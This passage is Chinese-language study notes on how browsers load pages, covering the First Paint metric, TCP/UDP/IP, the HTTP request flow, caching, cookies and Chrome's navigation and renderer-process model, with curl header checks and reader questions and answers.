英文好的话可以看他们提供的官方文档：https://docs.google.com/document/d/1n5hr4KJhZl2A4MicTfmyiHPdiKp7kmUoWXnRBN8SrZE/edit#\n对于浏览器中的页面崩溃的原因该怎么定位呢？很多情况下，问题并不能稳定复现，通过浏览器自带的开发者工具感觉很难定位到真正的问题。\n要定位页面崩溃页面，我们先要了解下有可能造成页面崩溃的因素，根据我的实际统计数据看来，主要有以下三个方便的因素：首先，主要因素是一些第三方插件注入浏览器或者页面进程，拦截了网页的一些正常操作而导致页面或者浏览器崩溃，如一些杀毒软件，或者卫士类软件，或者一些流量劫持软件。第二个因素是插件，虽然容易崩溃，但是通常情况下只会影响到自身的进程，不过我们以前的统计数据来看，也会小概率地影响到页面的崩溃，不过整体数据来看还好了。另外一个方向来看，插件的使用率已经越来越低了，所以插件不是个大问题。第三个因素是浏览器的一些 bug，如渲染引擎，JavaScript 引擎等，不过从统计数据来看，这类因素导致的崩溃也是越来越低的了，而且随着浏览器的更新升级，引起问题的因素也是在不断变化的。\n所以要直接给出页面崩溃原因是很难的，而且直接从 JS 的层面来看，也是很难跟踪崩溃原因的。提一个我之前使用的方法，那就是使用 JS 来统计页面是否崩溃，这类统计不是 100%准备，但是可以通过数据来大致判断页面是否崩溃，然后再找一些典型的用户环境来实地排查。\nTCP 协议 TCP 协议保证资源文件被完整传输。\nFP（First Paint）指标衡量的是从用户开始导航到页面上发生的第一次视觉变化的时间。这个指标关键在于衡量用户从请求页面到看到任何视觉反馈（即页面开始绘制）的时间长短。这是一个重要的性能指标，因为它直接关系到用户体验和页面的响应速度。\n页面加载的具体含义 页面加载通常指的是从用户发起页面请求（如在浏览器中输入网址、从一个页面跳转到另一个页面或刷新页面）开始，到浏览器开始接收并处理服务器返回的数据的过程。这个过程包括：\nDNS 解析：将域名转换为服务器的 IP 地址。 TCP 连接：建立与服务器的 TCP 连接，以便发送和接收数据。 发送请求：浏览器向服务器发送请求页面的数据。 接收响应：服务器处理请求后，向浏览器发送响应数据（HTML、CSS、JS 等）。 处理响应：浏览器开始接收数据并处理这些数据，准备渲染页面。 开始绘制的具体含义 开始绘制（First Paint）是指浏览器完成上述加载过程，开始处理 HTML、CSS 和 JavaScript，渲染进程开始将这些信息转换为屏幕上的像素的那一刻。这不仅包括文本和图像的渲染，也包括任何可以给用户视觉反馈的变化，比如背景色的变化。开始绘制是用户开始看到页面内容的第一刻，虽然这时页面可能还没有完全加载和渲染完成。\n总结来说，页面加载涉及从请求开始到浏览器接收并处理数据的整个过程，而开始绘制指的是这些数据被转换为屏幕上的视觉信息的起始时刻，标志着用户开始看到页面的视觉反馈。这两个过程的性能对于用户体验至关重要。\n影响 FP 指标其中一个重要的因素是资源在网络中的加载速度。\n获取 FP 时间\nname 为 \u0026rsquo; first-paint \u0026rsquo; 的 startTime 就是 FP 时间\n1 2 3 4 5 6 7 8 setTimeout(() =\u0026gt; { if (window.performance) { let pf = window.performance; let pfEntries = pf.getEntriesByType(\u0026#34;paint\u0026#34;); let fp = pfEntries.find((each) =\u0026gt; each.name === \u0026#34;first-paint\u0026#34;); console.log(\u0026#34;first paint time: \u0026#34;, fp \u0026amp;\u0026amp; fp.startTime); } }, 2000); 2s 后再获取进行上报，不然获取不到。\n优化 web 页面资源的加载速度，需要对网络协议有深刻的认识，就既能清楚如何优化资源加载速度，又能发现现有项目中的问题。\n在网络中，一个文件通常会被拆分为很多数据包来进行传输，而数据包在传输过程中又有很大概率丢失或者出错。那么如何保证页面文件能被完整地送达浏览器？\n数据的传输过程：\n数据包如何送达主机\n主机如何将数据包转交给应用\n数据是如何被完整地送达应用程序\n互联网是一套理念和协议组成的体系架构。协议是一套规则和标准，如果各方都同意使用，那么它们就能通信。\n互联网中的数据是通过数据包来传输的。如果发送的数据很大，那么该数据就会被拆分为很多小数据包来传输。\nIP IP：把数据包送达至目的主机。\n数据包要在互联网中传输，就必须知道起点和终点。而起点和终点由网际协议（Internet Protocol，简称 IP）标准规定。\n接入互联网的计算机的地址就称为 IP 地址，访问任何网站实际上只是你的计算机向另外一台计算机请求信息。\n如果要想把一个数据包从主机 A 发送给主机 B，那么在传输之前，数据包上会被附加上主机 B 的 IP 地址信息，这样在传输过程中才能正确寻址。额外地，数据包上还会附加上主机 A 本身的 IP 地址，有了这些信息主机 B 才可以回复信息给主机 A。这些附加的信息会被装进一个叫 IP 头的数据结构里。IP 头是 IP 数据包开头的信息，包含 IP 版本、源 IP 地址、目标 IP 地址、生存时间等信息。（网络层首部）\n先把网络简单分为三层结构，如下图：\nIP 只负责把数据包传送到对方电脑，但是对方电脑并不知道把数据包交给哪个程序。需要基于 IP 之上开发能和应用打交道的协议，最常见的是“用户数据包协议（User Datagram Protocol）”，简称 UDP。\nUDP UDP：把数据包送达应用程序。\nUDP 中一个最重要的信息是端口号，端口号就是一个数字，每个想访问网络的程序都需要绑定一个端口号。通过端口号。UDP 就能把指定的数据包发送给指定的程序，所以 IP 通过 IP 地址信息把数据包发送给指定的电脑，而 UDP 通过端口号把数据包分发给正确的程序。和 IP 头一样，端口号会被装进 UDP 头里面，UDP 头再和原始数据包合并组成新的 UDP 数据包。UDP 头中除了目的端口，还有源端口号等信息。（传输层首部）\n在使用 UDP 发送数据时，有各种因素会导致数据包出错，虽然 UDP 可以校验数据是否正确，但是对于错误的数据包，UDP 并不提供重发机制，只是丢弃当前的包，而且 UDP 在发送之后也无法知道是否能达到目的地。\n虽说 UDP 不能保证数据可靠性，但是传输速度却非常快，所以 UDP 会应用在一些关注速度、但不那么严格要求数据完整性的领域，如在线视频、互动游戏等。\nTCP TCP：把数据完整的送达应用程序。\n对于要求数据传输可靠性（reliability）的应用，如果使用 UDP 来传输会存在两个问题：\n数据包在传输过程中丢失； 大文件会被拆分成很多小的数据包来传输，这些小的数据包会经过不同的路由，并在不同的时间到达接收端，而 UDP 协议并不知道如何组装这些数据包，从而把这些数据包还原成完整的文件。 基于这两个问题，引入 TCP 。**TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议。**相对于 UDP，TCP 有下面两个特点:\n对于数据包丢失的情况，TCP 提供重传机制； TCP 引入了数据包排序机制，用来保证把乱序的数据包组合成一个完整的文件。 和 UDP 头一样，TCP 头除了包含了目标端口和本机端口号外，还提供了用于排序的序列号，以便接收端通过序号来重排数据包。\nTCP 下的单个数据包的传输流程：\nTCP 单个数据包的传输流程和 UDP 流程差不多，不同的地方在于，通过 TCP 头的信息保证了一个块大的数据传输的完整性。\n完整的 TCP 连接过程，通过这个过程，你可以明白 TCP 是如何保证重传机制和数据包的排序功能的。\n从下图可以看出，一个完整的 TCP 连接的生命周期包括了“建立连接”“传输数据”和“断开连接”三个阶段。\n建立连接阶段。通过“三次握手”来建立客户端和服务器之间的连接。TCP 提供面向连接的通信传输。面向连接是指在数据通信开始之前先做好两端之间的准备工作。所谓三次握手，是指在建立一个 TCP 连接时，客户端和服务器总共要发送三个数据包以确认连接的建立。 传输数据阶段。在该阶段，接收端在接收到数据包之后，需要发送确认数据包给发送端。当发送端发送了一个数据包之后，在规定时间内没有接收到接收端反馈的确认消息，则判断为数据包丢失，并触发发送端的重发机制。同样，一个大的文件在传输过程中会被拆分成很多小的数据包，这些数据包到达接收端后，接收端会按照 TCP 头中的序号为其排序，从而保证组成完整的数据。 断开连接阶段。数据传输完毕之后，就要终止连接，涉及到最后一个阶段“四次挥手”来保证双方都能断开连接。 TCP 为了保证数据传输的可靠性，牺牲了数据包的传输速度，因为“三次握手”和“数据包校验机制”等把传输过程中的数据包的数量提高了一倍。\n浏览器可以同时打开多个页签，他们端口一样吗？如果一样，数据怎么知道去哪个页签？\n端口一样的，网络进程知道每个 tcp 链接所对应的标签是那个，所以接收到数据后，会把数据分发给对应的渲染进程。\nTCP 传送数据时 浏览器端就做渲染处理了么？如果前面数据包丢了 后面数据包先来是要等么？类似的那种实时渲染怎么处理？针对数据包的顺序性？\n接收到 http 响应头中的 content-type 类型时就开始准备渲染进程了，响应体数据一旦接受到便开始做 DOM 解析了！基于 http 不用担心数据包丢失的问题，因为丢包和重传都是在 tcp 层解决的。http 能保证数据按照顺序接收的（也就是说，从 tcp 到 http 的数据就已经是完整的了，即便是实时渲染，如果发生丢包也得在重传后才能开始渲染）\nhttp 和 websocket 都是属于应用层的协议吗？ 都是应用层协议，而且 websocket 名字取的比较有迷惑性，其实和 socket 完全不一样，可以把 websocket 看出是 http 的改造版本，增加了服务器向客户端主动发送消息的能力。\n关于 \u0026ldquo;数据在传输的过程中有可能会丢失或者出错\u0026rdquo;，丢失的数据包去哪里了？凭空消失了吗？出错的数据包又变成啥了？ 为什么会出错？ 比如网络波动，物理线路故障，设备故障，恶意程序拦截，网络阻塞等等。\nHTTP 请求流程 HTTP 是一种浏览器向服务器获取资源的协议，通常由浏览器发起请求，用来获取不同类型的文件，例如 HTML 文件、CSS 文件、JavaScript 文件、图片、视频等。\n通常在第一次访问一个站点时，打开速度很慢，当再次访问这个站点时，速度就很快 当登录过一个网站之后，下次再访问该站点，就已经处于登录状态 要实现上面的能力，都是通过 http 协议中的请求头和响应头字段来实现的。\n分析一个 HTTP 请求过程中的每一步来了解 HTTP 协议。\n浏览器端发起 HTTP 请求流程 浏览器地址栏中输入 URL，浏览器的处理流程：\n构建请求行，浏览器构建请求行信息（如下所示），构建好后，浏览器准备发起网络请求。 1 GET /index.html HTTP1.1 查找缓存，在真正发起网络请求之前，浏览器会先在浏览器缓存中查询是否有要请求的文件。浏览器缓存是一种在本地保存资源副本的技术。\n当浏览器发现请求的资源已经在浏览器缓存中存有副本，它会拦截请求，返回该资源的副本，并直接结束请求，而不会再去源服务器重新下载。这样做的好处有：\n缓解服务器端压力，提升性能（获取资源的耗时更短了）； 对于网站来说，快速加载资源。 如果缓存查找失败，就会进入网络请求过程。\n准备 IP 地址和端口， HTTP 协议用来封装应用层请求的文本信息；并使用 TCP/IP 作传输层协议将它发到网络上，所以在 HTTP 工作开始之前，浏览器需要通过 TCP 与服务器建立连接。\nHTTP 网络请求的第一步是和服务器建立 TCP 连接（建立连接需要 IP 地址和端口号）\n利用 URL 地址来获取 IP 和端口信息。IP 地址是数字标识，难以记忆，使用域名就好记。所以基于这个需求又出现了一个服务，负责把域名和 IP 地址做一一映射关系。这套域名映射为 IP 的系统就叫做“域名系统”，简称 DNS（Domain Name System）。\n所以，推导下来，**第一步浏览器会请求 DNS 获取域名对应的 IP。**当然浏览器还提供了 DNS 数据缓存服务，如果某个域名已经解析过了，那么浏览器会缓存解析的结果，以供下次查询时直接使用，这样也会减少一次网络请求。\n拿到 IP 之后，接下来就需要获取端口号了。通常情况下，如果 URL 没有特别指明端口号，那么 HTTP 协议默认是 80 端口。\n等待 TCP 队列\nChrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。 当然，如果当前请求数量少于 6，会直接进入下一步，建立 TCP 连接。（应用层的对头堵塞）\n建立 TCP 连接 排队等待结束之后，在 HTTP 工作开始之前，浏览器通过 TCP 与服务器建立连接。\n发送 HTTP 请求 一旦建立了 TCP 连接，浏览器就可以和服务器进行通信了。而 HTTP 中的数据正是在这个通信过程中传输的。 首先浏览器会向服务器发送请求行，它包括了请求方法、请求 URI（Uniform Resource Identifier）和 HTTP 版本协议。发送请求行告诉服务器浏览器需要什么资源。\n在浏览器发送请求行命令之后，请求头发送其他一些信息，把浏览器的一些基础信息告诉服务器。比如包含了浏览器所使用的操作系统、浏览器内核等信息，以及当前请求的域名信息、浏览器端的 Cookie 信息，等等。\n服务器会根据浏览器的请求信息来准备相应的内容，一旦服务器处理结束，便可以返回数据给浏览器。\n工具软件 curl 来查看返回请求数据\n在 Windows 系统中，curl 是一个命令行工具，用于发送和接收网络请求。它可以通过不同的协议（如 HTTP、HTTPS、FTP 等）与服务器进行通信，从而允许用户在命令行界面下执行各种网络操作，如下载文件、发送表单数据等。\ncurl 可以通过命令行或脚本调用，并且在 Windows 系统中，可以通过下载 curl 的可执行文件，并将其添加到系统的 PATH 路径中，从而使其在命令提示符或脚本中可以直接调用。\n1 curl -i https://time.geekbang.org/ -i是为了返回响应行、响应头和响应体的数据 并不是所有的请求都可以被服务器处理的，那么一些无法处理或者处理出错的信息，服务器会通过请求行的状态码来告诉浏览器它的处理结果，比如：1. 最常用的状态码是 200，表示处理成功； 如果没有找到页面，则会返回 404。\n服务器也会随同响应向浏览器发送响应头，它包含了服务器自身的一些信息，比如服务器生成返回数据的时间、返回的数据类型（JSON、HTML、流媒体等类型），以及服务器要在客户端保存的 Cookie 等信息。\n发送完响应头后，继续发送响应体数据。\n断开连接\n通常情况下，一旦服务器向客户端返回了请求数据，它就要关闭 TCP 连接。不过如果浏览器或者服务器在其头信息中加入了：\n1 Connection:Keep-Alive 那么 TCP 连接在响应数据发送后将仍然保持打开状态，这样浏览器就可以继续通过同一个 TCP 连接发送请求。**保持 TCP 连接可以省去下次请求时需要建立连接的时间，提升资源加载速度。**一个 Web 页面中内嵌的图片就都来自同一个 Web 站点，如果初始化了一个持久连接，就可以复用该连接，以请求其他资源，而不需要重新再建立新的 TCP 连接。\n重定向\n1 curl -I geekbang.org //-I表示只需要获取响应头和响应行数据,不需要获取响应体的数据 当输入的 url 和最后真正访问的 url 不同时，一般是走了重定向。响应行返回的状态码是 301，重定向到另外一个网址，而需要重定向的网址正是包含在响应头的 Location 字段中，接下来，浏览器获取 Location 字段中的地址，并使用该地址重新导航。\n如果第二次页面打开很快，主要原因是第一次加载页面过程中，缓存了一些耗时的数据。\n哪些数据会被缓存？\nDNS 缓存和页面资源缓存这两块数据是会被浏览器缓存的。DNS 缓存主要就是在浏览器本地把对应的 IP 和域名关联起来\n浏览器资源缓存：\n服务器是通过什么方式让浏览器缓存数据？\n当服务器返回 HTTP 响应头给浏览器时，浏览器是通过响应头中的 Cache-Control 字段来设置是否缓存该资源。通常，还需要为这个资源设置一个缓存过期时长，而这个时长是通过 Cache-Control 中的 Max-age 参数来设置的，比如上图设置的缓存过期时间是 2000 秒。\n1 Cache-Control:Max-age=2000 这也就意味着，在该缓存资源还未过期的情况下, 如果再次请求该资源，会直接返回缓存中的资源给浏览器。\n但如果缓存过期了，浏览器则会继续发起网络请求，并且在 HTTP 请求头中带上：\n1 If-None-Match:\u0026#34;4f80f-13c-3a1xb12a\u0026#34; 服务器收到请求头后，会根据 If-None-Match 的值来判断请求的资源是否有更新。\n如果没有更新，就返回 304 状态码，相当于服务器告诉浏览器：“这个缓存可以继续使用，这次就不重复发送数据给你了”。\n如果资源有更新，服务器就直接返回最新资源给浏览器。\n简要来说，很多网站第二次访问能够秒开，是因为这些网站把很多资源都缓存在了本地，浏览器缓存直接使用本地副本来回应请求，而不会产生真实的网络请求，从而节省了时间。同时，DNS 数据也被浏览器缓存了，这又省去了 DNS 查询环节。\nHTTP 缓存\n登录状态是如何保持的?\n服务器接收到浏览器提交的信息之后，查询后台，验证用户登录信息是否正确，如果正确的话，会生成一段表示用户身份的字符串，并把该字符串写到响应头的 Set-Cookie 字段里，如下所示，然后把响应头发送给浏览器。\n1 Set-Cookie: UID=3431uad; 浏览器在接收到服务器的响应头后，开始解析响应头，如果遇到响应头里含有 Set-Cookie 字段的情况，浏览器就会把这个字段信息保存到本地。比如把 UID=3431uad 保持到本地。\n当用户再次访问时，浏览器会发起 HTTP 请求，但在发起请求之前，浏览器会读取之前保存的 Cookie 数据，并把数据写进请求头里的 Cookie 字段里（如下所示），然后浏览器再将请求头发送给服务器。\n1 Cookie: UID=3431uad; 服务器在收到 HTTP 请求头数据之后，就会查找请求头里面的“Cookie”字段信息，当查找到包含 UID=3431uad 的信息时，服务器查询后台，并判断该用户是已登录状态，然后生成含有该用户信息的页面数据，并把生成的数据发送给浏览器。\n如果服务器端发送的响应头内有 Set-Cookie 的字段，那么浏览器就会将该字段的内容保持到本地。当下次客户端再往该服务器发送请求时，客户端会自动在请求头中加入 Cookie 值后再发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到该用户的状态信息。\n如果一个页面的网络加载时间过久，你是如何分析卡在哪个阶段的？\n1 首先猜测最可能的出问题的地方，网络传输丢包比较严重，需要不断重传。然后通过 ping curl 看看对应的时延高不高。\n2 然后通过 wireshake 看看具体哪里出了问题。\n3 假如别人访问很快，自己电脑很慢，就要看看自己客户端是否有问题了。\n4 使用 chrome network 面板，看那个 瀑布图 中每个阶段的含义，就可以判断问题出现在那个方向了，每个阶段的含义，https://developers.google.com/web/tools/chrome-devtools/network/reference#timing-explanation 举个例子 Content Download 如果太长，很有可能是下载的资源太大，但也有可能是网络慢导致的下载太慢，简单计算一下，在例如 Waiting (TTFB) 这个太长的话，有可能是网络慢，或者就是后端处理时间过长导致的，至少可以排查掉前端原因，还有很多，例如 DNS lookup 等，但是最终要确认具体哪里慢，最好是结合系统日志去分析\n在浏览器中访问的时候打开 network 面板，发现缓存的来源有的 from disk 有的是 from memory。对于资源什么情况下缓存到硬盘什么时候缓存到内存？\n这是浏览器的三级缓存机制，使用 memory cache 比 disk cache 的访问速度要快。还有另外一种 cache，是 service worker 的 cache。\nChrome employs two caches — an on-disk cache and a very fast in-memory cache. The lifetime of an in-memory cache is attached to the lifetime of a render process, which roughly corresponds to a tab. Requests that are answered from the in-memory cache are invisible to the web request API. If a request handler changes its behavior (for example, the behavior according to which requests are blocked), a simple page refresh might not respect this changed behavior. To make sure the behavior change goes through, call handlerBehaviorChanged() to flush the in-memory cache. But don\u0026rsquo;t do it often; flushing the cache is a very expensive operation. You don\u0026rsquo;t need to call handlerBehaviorChanged() after registering or unregistering an event listener.\nMemory Cache : 内存缓存\nDisk Cache：硬盘缓存\n打开网页：查找 disk cache 中是否有匹配，如有则使用，如没有则发送网络请求普通刷新 (F5)：因 TAB 没关闭，因此 memory cache 是可用的，会被优先使用，其次才是 disk cache 强制刷新 (Ctrl + F5)：浏览器不使用缓存，因此发送的请求头部均带有 Cache-control: no-cache，服务器直接返回 200 和最新内容\n1、没有 keep-alive 时，http 数据传输完成后，是由浏览器主动发起断开 TCP 连接，还是由服务器主动发起断开 TCP 连接？ 2、设置了 keep-alive 时，当关闭页面时，浏览器会发起断开 TCP 连接吗？如果不关闭页面，浏览器会一直保持这个 TCP 连接吗？ 3、设置了 keep-alive 时，如果浏览器出现故障时了（挂掉了），此时服务器保持的 TCP 连接多久会释放？\n参考文章：https://blog.csdn.net/cccallen/article/details/8003324\n浏览器刷新操作，ctrl+F5 和 F5 有什么区别？\n一个是强制刷新，也就是资源都走网络。\n一个是正常处理流程。\n比如通过网络面板，打开一个站点，再使用强制刷新，可以看到如下信息 176 requests 3.1 MB transferred 3.5 MB resources Finish: 26.30 s DOMContentLoaded: 5.04 s Load: 14.88 s\n如果使用正常的刷新，看到的信息如下： 171 requests 419 KB transferred 3.2 MB resources Finish: 25.09 s DOMContentLoaded: 1.41 s Load: 6.24 s\n其中的 transferred 是真正的网络传输的数据，使用强制刷新，传输的数据体积就大多了，而且请求时间也变得更长了。\nctrl+F5 强制刷新 http 请求会少了 if-none-match 字段，所以不会协商缓存，将直接强制从服务器请求资源；f5 则会进行协商缓存。\nset cookie 会不会有安全问题？\ncookie 是不安全的，比如黑客可以通过一些手段插入一些脚本到你的页面里面（具体一些途径我们浏览器安全篇再讲），通过脚本获取到你的 cookie 数据，然后就可以利用 cookie 做一些坏事了。\n当然也有一些方法规避，常用的一个是将部分 cookie 设置成 httponly 的属性，设置了 httponly 属性后 cookie，就无法通过 js 脚本来读取了，只是在发送 http 请求时候会被带上！\n在做前端页面的时候，是否可以设置当前页面是否可以被缓存，以及哪些部分可以被缓存？还是说整个缓存机制都是由浏览器自己控制的？\n是没有办法通过前端代码来控制缓存的，缓存是后端或者部署的同学来控制的，但是前端同学应该知道那些内容要被缓存，和后端或者部署的同学配合来打！\nChrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。 是指同一个域名下的 6 个并发请求么。我理解建立一个 tcp 连接，可以处理多个请求吧？\nhttp/1.1 一个 tcp 同时只能处理一个请求，浏览器会为每个域名维护 6 个 tcp 连接！\n但是每个 tcp 连接是可以复用的，也就是处理完一个请求之后，不断开这个 tcp 连接，可以用来处理下个 http 请求！\n不过 http2 是可以并行请求资源的，所以如果使用 http2，浏览器只会为每个域名维护一个 tcp 连接。\nhttp2 同个域名只能维持一个长连接。那我现在打开了一个域名下的 a 页面，然后又打开了这个域名的 b 页面，那这个 b 页面是新开一个 tcp 长连接吗？还是会用 a 页面的长连接？换句话说，维持一个 tcp 长连接，指的是一个页面维持一个？还是整个浏览器维持一个？还是同一个渲染进程维持一个？\n浏览器为用同一个域名只维护一个 TCP 连接。\n你从通过 Chrome 打开 chrome://net-export/ 这个地址，然后记录网络过程。\n最后在使用这个https://netlog-viewer.appspot.com/ 打开你日志文件，就能看到 h2 的详细信息了。\n同域名只能建立 6 个 tcp 链接的话，那加载大量图片或者其他资源的时候不是很卡呢？\n是的，通常如图片这种静态资源都是直接配置到 cdn 上的(域名发散)。\n导航流程 从输入 URL 到页面展示，这中间发生了什么？\n整个过程需要各个进程之间的配合。\n浏览器进程主要负责用户交互、子进程管理和文件储存等功能\n网络进程是为渲染进程和浏览器进程等提供网络下载功能\n渲染进程的主要职责是把从网络下载的 HTML、JavaScript、CSS、图片等资源解析为可以显示和交互的页面。因为渲染进程所有的内容都是通过网络获取的，会存在一些恶意代码利用浏览器漏洞对系统进行攻击，所以运行在渲染进程里面的代码是不被信任的(渲染进程运行在安全沙箱里)。\n浏览器进程接收到用户输入的 URL 请求，通过 IPC 进程间通信将该 URL 转发给网络进程 在网络进程中发起真正的 URL 请求（可能走缓存） 然后服务器返回 HTTP 数据到网络进程，网络进程解析 HTTP 响应头数据，并将其转发给浏览器进程 浏览器进程接收到网络进程的响应头数据之后，发送“提交导航 (CommitNavigation)”消息到渲染进程，发送 CommitNavigation 时会携带响应头等基本信息 渲染进程接收到“提交导航”的消息之后，便开始准备接收 HTML 数据，接收数据的方式是直接和网络进程建立数据管道 渲染进程会向浏览器进程“确认提交”，这是告诉浏览器进程：“已经准备好接受和解析页面数据了” 浏览器进程接收到渲染进程“提交文档”的消息之后，便开始移除之前旧的文档，然后更新浏览器进程中的页面状态 用户发出 URL 请求到页面开始解析的这个过程，就叫做导航。\n用户输入 当用户在地址栏中输入一个查询关键字时，浏览器进程会判断输入的关键字是搜索内容，还是请求的 URL。\n如果是搜索内容，会使用浏览器默认的搜索引擎，来合成新的带搜索关键字的 URL。\n如果判断输入内容符合 URL 规则，比如输入的是 baidu.com，那么地址栏会根据规则，把这段内容加上协议，合成为完整的 URL\n当用户输入关键字并键入回车之后，这意味着当前页面即将要被替换成新的页面，不过在这个流程继续之前，浏览器还给了当前页面一次执行 beforeunload 事件，beforeunload 事件允许页面在退出之前执行一些数据清理操作，还可以询问用户是否要离开当前页面，比如当前页面可能有未提交完成的表单等情况，因此用户可以通过 beforeunload 事件来取消导航，让浏览器不再执行任何后续工作。\n当前页面没有监听 beforeunload 事件或者同意了继续后续流程，那么浏览器便进入下图的状态：\n从图中可以看出，当浏览器刚开始加载一个地址之后，标签页上的图标便进入了加载状态。但此时图中页面显示的依然是之前打开的页面内容，并没立即替换为新的页面。因为需要等待提交文档阶段，页面内容才会被替换。\nURL 请求过程 进入了页面资源请求过程。这时，浏览器进程会通过进程间通信（IPC）把 URL 请求发送至网络进程，网络进程接收到 URL 请求后，会在这里发起真正的 URL 请求流程。具体流程：\n网络进程查找本地缓存是否缓存了该资源。如果有缓存资源，那么直接返回资源给浏览器进程；如果在缓存中没有查找到资源，那么进入网络请求流程。\n请求前的第一步是要进行 DNS 解析，以获取请求域名的服务器 IP 地址。如果请求协议是 HTTPS，那么还需要建立 TLS 连接。\n接下来利用 IP 地址和服务器建立 TCP 连接。连接建立之后，浏览器端会构建请求行、请求头等信息，并把和该域名相关的 Cookie 等数据附加到请求头中，然后向服务器发送构建的请求信息。\n服务器接收到请求信息后，会根据请求信息生成响应数据（包括响应行、响应头和响应体等信息），并发给网络进程。等网络进程接收了响应行和响应头之后，就开始解析响应头的内容。（下面将服务器返回的响应头和响应行统称为响应头）\n重定向(插曲) 在接收到服务器返回的响应头后，网络进程开始解析响应头，如果发现返回的状态码是 301 或者 302，那么说明服务器需要浏览器重定向到其他 URL。这时网络进程会从响应头的 Location 字段里面读取重定向的地址，然后再发起新的 HTTP 或者 HTTPS 请求，一切又重头开始。\n1 curl -I http://time.geekbang.org/ // curl -I + URL的命令是接收服务器返回的响应头的信息 服务器会通过重定向的方式把所有 HTTP 请求转换为 HTTPS 请求。也就是说你使用 HTTP 向极客时间服务器请求时，服务器会返回一个包含有 301 或者 302 状态码响应头，并把响应头的 Location 字段中填上 HTTPS 的地址，这就是告诉了浏览器要重新导航到新的地址上。\n1 curl -I https://time.geekbang.org/ 如果响应行是 200，那么表示浏览器可以继续处理该请求。\n响应数据类型处理 URL 请求的数据类型，有时候是一个下载类型，有时候是正常的 HTML 页面，那么浏览器是如何区分它们呢？\nContent-Type 是 HTTP 头中一个非常重要的字段， 它告诉浏览器，服务器返回的响应体数据是什么类型，然后浏览器会根据 Content-Type 的值来决定如何显示响应体的内容。\n1 url -I https://time.geekbang.org/ 响应头中的 Content-type 字段的值是 text/html，这就是告诉浏览器，服务器返回的数据是 HTML 格式。\ncurl 来请求安装包的地址:\n1 curl -I https://res001.geekbang.org/apps/geektime/android/2.3.1/official/geektime_2.3.1_20190527-2136_offical.apk Content-Type 的值是 application/octet-stream，显示数据是字节流类型的，通常情况下，浏览器会按照下载类型来处理该请求。\n需要注意的是，如果服务器配置 Content-Type 不正确，比如将 text/html 类型配置成 application/octet-stream 类型，那么浏览器可能会曲解文件内容，比如会将一个本来是用来展示的页面，变成了一个下载文件。\n不同 Content-Type 的后续处理流程也截然不同。如果 Content-Type 字段的值被浏览器判断为下载类型，那么该请求会被提交给浏览器的下载管理器，同时该 URL 请求的导航流程就此结束。但如果是 HTML，那么浏览器则会继续进行导航流程。由于 Chrome 的页面渲染是运行在渲染进程中的，所以接下来就需要准备渲染进程了。\n准备渲染进程 默认情况下，Chrome 会为每个页面分配一个渲染进程，也就是说，每打开一个新页面就会配套创建一个新的渲染进程。但是，也有一些例外，在某些情况下，浏览器会让多个页面直接运行在同一个渲染进程中。\n比如从极客时间的首页里面打开了另外一个页面——算法训练营，看下图的 Chrome 的任务管理器截图：\n从图中可以看出，打开的这三个页面都是运行在同一个渲染进程中，进程 ID 是 23601。\n那什么情况下多个页面会同时运行在一个渲染进程中呢？\n先了解下什么是同一站点（same-site）。具体地讲，将“同一站点”定义为根域名（例如，geekbang.org）加上协议（例如，https:// 或者 http://），还包含了该根域名下的所有子域名和不同的端口，比如下面这三个：\n1 2 3 https://time.geekbang.org https://www.geekbang.org https://www.geekbang.org:8080 它们都是属于同一站点，因为它们的协议都是 HTTPS，而且根域名也都是 geekbang.org。\nChrome 的默认策略是，每个标签对应一个渲染进程。但如果从一个页面打开了另一个新页面，而新页面和当前页面属于同一站点的话，那么新页面会复用父页面的渲染进程(不一定，得看站点)。官方把这个默认策略叫 process-per-site-instance。\n访问不同站点得不同页面：\n总结来说，打开一个新页面采用的渲染进程策略就是：（面试）\n通常情况下，打开新的页面都会为这个页面开启一个新的单独的渲染进程；\n如果从 A 页面打开 B 页面，且 A 和 B 都属于同一站点的话，那么 B 页面复用 A 页面的渲染进程；\n如果是其他情况，浏览器进程则会为 B 创建一个新的渲染进程。\n渲染进程准备好之后，还不能立即开始文档解析状态，因为此时的文档数据还在网络进程中，并没有提交给渲染进程，所以下一步就进入了提交文档阶段。\n提交文档 首先要明确一点，这里的“文档”是指 URL 请求的响应体数据（HTML）。\n所谓提交文档，就是指浏览器进程将网络进程接收到的 HTML 数据提交给渲染进程，具体流程是这样的：\n首先当浏览器进程接收到网络进程的响应头数据之后（“提交文档”的消息是由浏览器进程发出的），便向渲染进程发起“提交文档”的消息； 渲染进程接收到“提交文档”的消息后，会和网络进程建立传输数据的“管道”； 渲染进程是边接收网络进程传输过来的 html 一边解析的，等文档数据传输（网络请求回完所有分段的数据包后）完成之后，渲染进程会返回“确认提交”的消息给浏览器进程； 浏览器进程在收到“确认提交”的消息后，会更新浏览器界面状态，包括了安全状态、地址栏的 URL、前进后退的历史状态，并更新 Web 页面 其中，当渲染进程确认提交之后，更新内容如下图所示：\n这也就解释了为什么在浏览器的地址栏里面输入了一个地址后，之前的页面没有立马消失，而是要加载一会儿才会更新页面。\n到这里，一个完整的导航流程就“走”完了，这之后就要进入渲染阶段了。\n渲染阶段 一旦文档被提交，而无需等到“确认提交”时刻，渲染进程便开始页面解析和子资源加载（边加载边解析）。一旦页面生成完成，渲染进程会发送一个消息给浏览器进程，浏览器接收到消息后，会停止标签图标上的加载动画。\n1，用户输入 url 并回车\n2，浏览器进程检查 url，组装协议，构成完整的 url\n3，浏览器进程通过进程间通信（IPC）把 url 请求发送给网络进程\n4，网络进程接收到 url 请求后检查本地缓存是否缓存了该请求资源，如果有则将该资源返回给浏览器进程\n5，如果没有，网络进程向 web 服务器发起 http 请求（网络请求），请求流程如下：\n​ 5.1 进行 DNS 解析，获取服务器 ip 地址，端口\n​ 5.2 利用 ip 地址和服务器建立 tcp 连接\n​ 5.3 构建请求头信息\n​ 5.4 发送请求头信息\n​ 5.5 服务器响应后，网络进程接收响应头和响应信息，并解析响应内容\n网络进程解析响应流程；\n6.1 检查状态码，如果是 301/302，则需要重定向，从 Location 自动中读取地址，重新进行第 4 步 ，如果是 